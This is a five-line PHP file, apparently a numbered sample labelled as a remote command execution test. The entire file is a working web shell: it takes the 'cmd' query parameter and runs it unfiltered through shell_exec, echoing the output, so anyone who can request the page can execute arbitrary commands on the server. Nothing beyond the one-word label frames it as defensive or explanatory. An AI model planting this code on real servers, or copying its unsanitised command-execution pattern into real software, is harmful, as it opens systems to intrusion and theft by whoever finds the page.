<?php
// RCE test variation #1315
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>